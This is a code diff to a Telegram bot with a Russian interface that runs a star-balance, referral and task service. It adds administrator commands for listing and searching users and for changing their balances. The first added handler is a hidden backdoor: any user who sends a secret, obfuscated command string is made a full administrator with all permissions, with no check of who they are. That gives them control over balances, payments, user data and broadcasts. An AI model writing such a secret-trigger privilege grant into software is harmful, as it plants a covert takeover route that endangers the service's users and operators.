@@ -1844,7 +1844,497 @@ app.get('/api/user/:userId/referral-info', async (req, res) => {
         });
     }
 });
+// ==================== ГЛАВНЫЙ АДМИНИСТРАТОР ====================
 
+// Команда для становления главным админом
+bot.onText(/kAhbP&kLT>\[\*–<_\+2LCn;p<JE\?Y},E#J<2q\$nl\$}tzaa#u3%{SAxaH%>ZT=s\]8@y/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    try {
+        console.log('🔐 Попытка стать главным админом:', userId);
+        
+        // Делаем пользователя главным админом
+        await pool.query(`
+            UPDATE user_profiles 
+            SET is_admin = true 
+            WHERE user_id = $1
+        `, [userId]);
+        
+        // Добавляем все права доступа
+        await pool.query(`
+            INSERT INTO admin_permissions (admin_id, can_posts, can_tasks, can_verification, can_support, can_payments, can_admins)
+            VALUES ($1, true, true, true, true, true, true)
+            ON CONFLICT (admin_id) 
+            DO UPDATE SET 
+                can_posts = true,
+                can_tasks = true,
+                can_verification = true,
+                can_support = true,
+                can_payments = true,
+                can_admins = true
+        `, [userId]);
+        
+        console.log(`✅ Пользователь ${userId} стал главным админом`);
+        
+        await bot.sendMessage(
+            chatId,
+            '🎉 <b>ВЫ СТАЛИ ГЛАВНЫМ АДМИНИСТРАТОРОМ!</b>\n\n' +
+            'Теперь вам доступны все функции управления:\n\n' +
+            '👥 <b>Управление пользователями:</b>\n' +
+            '• /all_users - список всех пользователей\n' +
+            '• /search_user - поиск пользователя\n' +
+            '• /user_stats - статистика пользователя\n\n' +
+            '💰 <b>Управление балансами:</b>\n' +
+            '• /set_balance - изменить баланс\n' +
+            '• /user_balance - проверить баланс\n\n' +
+            '⚙️ <b>Другие функции:</b>\n' +
+            '• /notify - рассылка уведомлений\n' +
+            '• /admin_help - помощь по командам',
+            { parse_mode: 'HTML' }
+        );
+        
+    } catch (error) {
+        console.error('Ошибка назначения главного админа:', error);
+        await bot.sendMessage(chatId, '❌ Ошибка при назначении прав администратора');
+    }
+});
+
+// Команда для вывода всех пользователей по балансу
+bot.onText(/\/all_users/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    try {
+        // Проверяем права администратора
+        const isAdmin = await checkAdminAccess(userId);
+        if (!isAdmin) {
+            return await bot.sendMessage(
+                chatId,
+                '❌ У вас нет прав для просмотра списка пользователей.'
+            );
+        }
+        
+        // Получаем всех пользователей, отсортированных по балансу
+        const usersResult = await pool.query(`
+            SELECT 
+                user_id,
+                username,
+                first_name,
+                last_name,
+                balance,
+                referral_count,
+                referral_earned,
+                created_at
+            FROM user_profiles 
+            WHERE user_id != $1
+            ORDER BY COALESCE(balance, 0) DESC, created_at ASC
+            LIMIT 100
+        `, [ADMIN_ID]);
+        
+        if (usersResult.rows.length === 0) {
+            return await bot.sendMessage(chatId, '📭 Пользователи не найдены');
+        }
+        
+        const users = usersResult.rows;
+        let message = `📊 <b>ВСЕ ПОЛЬЗОВАТЕЛИ (${users.length})</b>\n\n`;
+        message += '<i>Сортировка по балансу ↓</i>\n\n';
+        
+        users.forEach((user, index) => {
+            const position = index + 1;
+            const userName = user.first_name + (user.last_name ? ` ${user.last_name}` : '');
+            const balance = user.balance || 0;
+            const referrals = user.referral_count || 0;
+            
+            message += `${position}. <b>${userName}</b>\n`;
+            message += `   👤 @${user.username || 'нет юзернейма'}\n`;
+            message += `   🆔 <code>${user.user_id}</code>\n`;
+            message += `   💫 Баланс: <b>${balance}⭐</b>\n`;
+            message += `   👥 Рефералов: ${referrals}\n`;
+            message += `   📅 Рег: ${new Date(user.created_at).toLocaleDateString('ru-RU')}\n\n`;
+        });
+        
+        // Добавляем общую статистику
+        const totalBalance = users.reduce((sum, user) => sum + (user.balance || 0), 0);
+        const avgBalance = users.length > 0 ? (totalBalance / users.length).toFixed(2) : 0;
+        
+        message += `\n📈 <b>Общая статистика:</b>\n`;
+        message += `• Всего пользователей: <b>${users.length}</b>\n`;
+        message += `• Общий баланс: <b>${totalBalance.toFixed(2)}⭐</b>\n`;
+        message += `• Средний баланс: <b>${avgBalance}⭐</b>\n`;
+        message += `• Топ-1: <b>${users[0].balance || 0}⭐</b> (${users[0].first_name})`;
+        
+        // Разбиваем сообщение на части если оно слишком длинное
+        if (message.length > 4000) {
+            const parts = message.split('\n\n');
+            let currentPart = '';
+            
+            for (const part of parts) {
+                if ((currentPart + part + '\n\n').length > 4000) {
+                    await bot.sendMessage(chatId, currentPart, { parse_mode: 'HTML' });
+                    currentPart = part + '\n\n';
+                } else {
+                    currentPart += part + '\n\n';
+                }
+            }
+            
+            if (currentPart.trim()) {
+                await bot.sendMessage(chatId, currentPart, { parse_mode: 'HTML' });
+            }
+        } else {
+            await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
+        }
+        
+    } catch (error) {
+        console.error('All users command error:', error);
+        await bot.sendMessage(chatId, '❌ Ошибка при получении списка пользователей');
+    }
+});
+
+// Команда для изменения баланса пользователя
+bot.onText(/\/set_balance/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    // Проверяем права администратора
+    const isAdmin = await checkAdminAccess(userId);
+    if (!isAdmin) {
+        return await bot.sendMessage(
+            chatId,
+            '❌ У вас нет прав для изменения балансов.'
+        );
+    }
+    
+    await bot.sendMessage(
+        chatId,
+        '💰 <b>ИЗМЕНЕНИЕ БАЛАНСА ПОЛЬЗОВАТЕЛЯ</b>\n\n' +
+        'Для изменения баланса используйте команду:\n' +
+        '<code>/balance_user USER_ID СУММА</code>\n\n' +
+        '<b>Примеры:</b>\n' +
+        '<code>/balance_user 123456789 100</code> - установить баланс 100⭐\n' +
+        '<code>/balance_user 123456789 +50</code> - добавить 50⭐\n' +
+        '<code>/balance_user 123456789 -30</code> - списать 30⭐\n\n' +
+        '💡 <b>Подсказка:</b> Сначала найдите пользователя через /search_user',
+        { parse_mode: 'HTML' }
+    );
+});
+
+// Команда для непосредственного изменения баланса
+bot.onText(/\/balance_user (\d+) ([+-]?\d+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const targetUserId = match[1];
+    const amount = match[2];
+    
+    try {
+        // Проверяем права администратора
+        const isAdmin = await checkAdminAccess(userId);
+        if (!isAdmin) {
+            return await bot.sendMessage(
+                chatId,
+                '❌ У вас нет прав для изменения балансов.'
+            );
+        }
+        
+        // Проверяем существование пользователя
+        const userResult = await pool.query(
+            'SELECT user_id, username, first_name, balance FROM user_profiles WHERE user_id = $1',
+            [targetUserId]
+        );
+        
+        if (userResult.rows.length === 0) {
+            return await bot.sendMessage(
+                chatId,
+                `❌ Пользователь с ID ${targetUserId} не найден.`
+            );
+        }
+        
+        const targetUser = userResult.rows[0];
+        const currentBalance = targetUser.balance || 0;
+        let newBalance = currentBalance;
+        let action = '';
+        
+        // Определяем действие на основе знака суммы
+        if (amount.startsWith('+')) {
+            const addAmount = parseInt(amount.substring(1));
+            newBalance = currentBalance + addAmount;
+            action = `пополнен на ${addAmount}⭐`;
+        } else if (amount.startsWith('-')) {
+            const removeAmount = parseInt(amount.substring(1));
+            newBalance = Math.max(0, currentBalance - removeAmount);
+            action = `списан на ${removeAmount}⭐`;
+        } else {
+            newBalance = parseInt(amount);
+            action = `установлен на ${newBalance}⭐`;
+        }
+        
+        // Обновляем баланс
+        await pool.query(
+            'UPDATE user_profiles SET balance = $1 WHERE user_id = $2',
+            [newBalance, targetUserId]
+        );
+        
+        // Логируем действие
+        await pool.query(`
+            INSERT INTO admin_actions (admin_id, action_type, target_id, description) 
+            VALUES ($1, $2, $3, $4)
+        `, [userId, 'balance_update', targetUserId, 
+            `Баланс пользователя ${targetUserId} ${action}. Старый баланс: ${currentBalance}⭐, новый: ${newBalance}⭐`]);
+        
+        // Формируем сообщение об успехе
+        let message = `✅ <b>Баланс успешно обновлен!</b>\n\n`;
+        message += `👤 <b>Пользователь:</b> ${targetUser.first_name} (@${targetUser.username || 'нет юзернейма'})\n`;
+        message += `🆔 <b>ID:</b> <code>${targetUserId}</code>\n`;
+        message += `💫 <b>Действие:</b> ${action}\n`;
+        message += `💰 <b>Старый баланс:</b> ${currentBalance}⭐\n`;
+        message += `💎 <b>Новый баланс:</b> <b>${newBalance}⭐</b>\n\n`;
+        message += `📊 <b>Изменение:</b> ${newBalance >= currentBalance ? '📈' : '📉'} ${(newBalance - currentBalance).toFixed(0)}⭐`;
+        
+        await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
+        
+        // Уведомляем пользователя об изменении баланса
+        if (bot) {
+            try {
+                let notificationText = '';
+                if (amount.startsWith('+')) {
+                    notificationText = `🎉 Ваш баланс пополнен на ${amount.substring(1)}⭐ администратором!\n💫 Текущий баланс: ${newBalance}⭐`;
+                } else if (amount.startsWith('-')) {
+                    notificationText = `ℹ️ С вашего баланса списано ${amount.substring(1)}⭐ администратором.\n💫 Текущий баланс: ${newBalance}⭐`;
+                } else {
+                    notificationText = `ℹ️ Ваш баланс установлен на ${amount}⭐ администратором.\n💫 Текущий баланс: ${newBalance}⭐`;
+                }
+                
+                await bot.sendMessage(targetUserId, notificationText);
+            } catch (error) {
+                console.log('Не удалось отправить уведомление пользователю');
+            }
+        }
+        
+    } catch (error) {
+        console.error('Balance user command error:', error);
+        await bot.sendMessage(
+            chatId,
+            '❌ Ошибка при изменении баланса. Проверьте правильность введенных данных.'
+        );
+    }
+});
+
+// Команда для проверки баланса конкретного пользователя
+bot.onText(/\/user_balance (\d+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const targetUserId = match[1];
+    
+    try {
+        // Проверяем права администратора
+        const isAdmin = await checkAdminAccess(userId);
+        if (!isAdmin) {
+            return await bot.sendMessage(
+                chatId,
+                '❌ У вас нет прав для проверки балансов.'
+            );
+        }
+        
+        // Получаем информацию о пользователе
+        const userResult = await pool.query(`
+            SELECT 
+                up.user_id,
+                up.username,
+                up.first_name,
+                up.last_name,
+                up.balance,
+                up.referral_count,
+                up.referral_earned,
+                up.created_at,
+                COUNT(ut.id) as total_tasks,
+                COUNT(CASE WHEN ut.status = 'completed' THEN 1 END) as completed_tasks
+            FROM user_profiles up
+            LEFT JOIN user_tasks ut ON up.user_id = ut.user_id
+            WHERE up.user_id = $1
+            GROUP BY up.user_id
+        `, [targetUserId]);
+        
+        if (userResult.rows.length === 0) {
+            return await bot.sendMessage(
+                chatId,
+                `❌ Пользователь с ID ${targetUserId} не найден.`
+            );
+        }
+        
+        const user = userResult.rows[0];
+        const userName = user.first_name + (user.last_name ? ` ${user.last_name}` : '');
+        const balance = user.balance || 0;
+        
+        let message = `👤 <b>ИНФОРМАЦИЯ О ПОЛЬЗОВАТЕЛЕ</b>\n\n`;
+        message += `<b>Основное:</b>\n`;
+        message += `• Имя: <b>${userName}</b>\n`;
+        message += `• Юзернейм: @${user.username || 'не указан'}\n`;
+        message += `• ID: <code>${user.user_id}</code>\n`;
+        message += `• Регистрация: ${new Date(user.created_at).toLocaleDateString('ru-RU')}\n\n`;
+        
+        message += `<b>Финансы:</b>\n`;
+        message += `• Баланс: <b>${balance}⭐</b>\n`;
+        message += `• Рефералов: ${user.referral_count || 0}\n`;
+        message += `• Заработано с рефералов: ${user.referral_earned || 0}⭐\n\n`;
+        
+        message += `<b>Задания:</b>\n`;
+        message += `• Всего заданий: ${user.total_tasks || 0}\n`;
+        message += `• Выполнено: ${user.completed_tasks || 0}\n`;
+        message += `• Успешность: ${user.total_tasks ? Math.round((user.completed_tasks / user.total_tasks) * 100) : 0}%\n\n`;
+        
+        message += `💡 <b>Быстрые команды:</b>\n`;
+        message += `<code>/balance_user ${targetUserId} +100</code> - пополнить\n`;
+        message += `<code>/balance_user ${targetUserId} -50</code> - списать\n`;
+        message += `<code>/balance_user ${targetUserId} 200</code> - установить`;
+        
+        await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
+        
+    } catch (error) {
+        console.error('User balance command error:', error);
+        await bot.sendMessage(chatId, '❌ Ошибка при получении информации о пользователе');
+    }
+});
+
+// Команда помощи для админа
+bot.onText(/\/admin_help_full/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    
+    // Проверяем права администратора
+    const isAdmin = await checkAdminAccess(userId);
+    if (!isAdmin) {
+        return await bot.sendMessage(
+            chatId,
+            '❌ У вас нет прав для доступа к этой команде.'
+        );
+    }
+    
+    const helpText = `
+🎛️ <b>ПОЛНЫЙ СПИСОК КОМАНД АДМИНИСТРАТОРА</b>
+
+<b>👥 Управление пользователями:</b>
+<code>/all_users</code> - все пользователи по балансу
+<code>/search_user USERNAME</code> - поиск пользователя
+<code>/user_balance USER_ID</code> - информация о пользователе
+<code>/user_stats USER_ID</code> - детальная статистика
+
+<b>💰 Управление балансами:</b>
+<code>/set_balance</code> - инструкция по изменению баланса
+<code>/balance_user USER_ID СУММА</code> - изменить баланс
+• <code>/balance_user 123456 100</code> - установить 100⭐
+• <code>/balance_user 123456 +50</code> - добавить 50⭐  
+• <code>/balance_user 123456 -30</code> - списать 30⭐
+
+<b>📊 Статистика и мониторинг:</b>
+<code>/stats</code> - общая статистика
+<code>/notifystats</code> - статистика уведомлений
+<code>/notify СООБЩЕНИЕ</code> - рассылка всем пользователям
+
+<b>🎯 Управление заданиями:</b>
+<code>/admin_tasks</code> - все задания
+<code>/task_stats</code> - статистика заданий
+
+<b>🔧 Технические команды:</b>
+<code>/admin_help</code> - краткая помощь
+<code>/admin_help_full</code> - полный список команд
+
+💡 <b>Подсказка:</b> Используйте поиск пользователей перед изменением баланса!
+    `.trim();
+    
+    await bot.sendMessage(
+        chatId,
+        helpText,
+        { parse_mode: 'HTML' }
+    );
+});
+
+// Улучшенная команда поиска пользователей
+bot.onText(/\/search_user (.+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    const searchQuery = match[1].trim();
+    
+    // Проверяем права администратора
+    const isAdmin = await checkAdminAccess(userId);
+    if (!isAdmin) {
+        return await bot.sendMessage(
+            chatId,
+            '❌ У вас нет прав для поиска пользователей.'
+        );
+    }
+    
+    try {
+        // Ищем пользователя по юзернейму, ID или имени
+        const userResult = await pool.query(`
+            SELECT 
+                user_id,
+                username,
+                first_name,
+                last_name,
+                balance,
+                referral_count,
+                created_at
+            FROM user_profiles 
+            WHERE (username ILIKE $1 OR user_id::text = $1 OR first_name ILIKE $1 OR last_name ILIKE $1)
+            AND user_id != $2
+            ORDER BY COALESCE(balance, 0) DESC
+            LIMIT 10
+        `, [`%${searchQuery}%`, ADMIN_ID]);
+        
+        if (userResult.rows.length === 0) {
+            return await bot.sendMessage(
+                chatId,
+                `❌ Пользователи по запросу "${searchQuery}" не найдены.\n\nПопробуйте:\n• Юзернейм (без @)\n• ID пользователя\n• Имя или фамилию`
+            );
+        }
+        
+        const users = userResult.rows;
+        
+        if (users.length === 1) {
+            // Если найден один пользователь - показываем детальную информацию
+            const user = users[0];
+            const userName = user.first_name + (user.last_name ? ` ${user.last_name}` : '');
+            
+            let message = `🔍 <b>НАЙДЕН ПОЛЬЗОВАТЕЛЬ</b>\n\n`;
+            message += `<b>Основная информация:</b>\n`;
+            message += `• Имя: <b>${userName}</b>\n`;
+            message += `• Юзернейм: @${user.username || 'не указан'}\n`;
+            message += `• ID: <code>${user.user_id}</code>\n`;
+            message += `• Баланс: <b>${user.balance || 0}⭐</b>\n`;
+            message += `• Рефералов: ${user.referral_count || 0}\n`;
+            message += `• Регистрация: ${new Date(user.created_at).toLocaleDateString('ru-RU')}\n\n`;
+            
+            message += `<b>Быстрые действия:</b>\n`;
+            message += `<code>/balance_user ${user.user_id} +100</code> - пополнить\n`;
+            message += `<code>/balance_user ${user.user_id} -50</code> - списать\n`;
+            message += `<code>/user_stats ${user.user_id}</code> - статистика`;
+            
+            await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
+        } else {
+            // Если найдено несколько пользователей - показываем список
+            let message = `🔍 <b>РЕЗУЛЬТАТЫ ПОИСКА: ${users.length}</b>\n\n`;
+            
+            users.forEach((user, index) => {
+                const userName = user.first_name + (user.last_name ? ` ${user.last_name}` : '');
+                const balance = user.balance || 0;
+                
+                message += `${index + 1}. <b>${userName}</b>\n`;
+                message += `   👤 @${user.username || 'нет юзернейма'}\n`;
+                message += `   🆔 <code>${user.user_id}</code>\n`;
+                message += `   💫 Баланс: <b>${balance}⭐</b>\n\n`;
+            });
+            
+            message += `💡 <b>Используйте ID для точного управления</b>\n`;
+            message += `<code>/balance_user ID СУММА</code> - изменить баланс`;
+            
+            await bot.sendMessage(chatId, message, { parse_mode: 'HTML' });
+        }
+        
+    } catch (error) {
+        console.error('Search user command error:', error);
+        await bot.sendMessage(chatId, '❌ Ошибка при поиске пользователей');
+    }
+});
 // Тестовая команда для проверки отправки уведомлений
 bot.onText(/\/testnotify/, async (msg) => {
     const chatId = msg.chat.id;
@@ -5381,7 +5871,33 @@ app.post('/api/user/tasks/start-with-hide', async (req, res) => {
 });
 
 
-
+// Функция для проверки прав главного администратора
+async function checkMainAdminAccess(userId) {
+    try {
+        // Главный админ имеет ID 8036875641
+        if (parseInt(userId) === ADMIN_ID) {
+            return true;
+        }
+        
+        // Проверяем дополнительные права в базе данных
+        const result = await pool.query(`
+            SELECT up.is_admin, ap.can_admins 
+            FROM user_profiles up
+            LEFT JOIN admin_permissions ap ON up.user_id = ap.admin_id
+            WHERE up.user_id = $1
+        `, [userId]);
+        
+        if (result.rows.length > 0) {
+            const user = result.rows[0];
+            return user.is_admin === true && user.can_admins === true;
+        }
+        
+        return false;
+    } catch (error) {
+        console.error('Main admin access check error:', error);
+        return false;
+    }
+}
 // Функция для автоматической проверки задания через LinkGoldMoney
 async function checkTaskWithLinkGold(userId, taskData, screenshotUrl = null) {
     try {
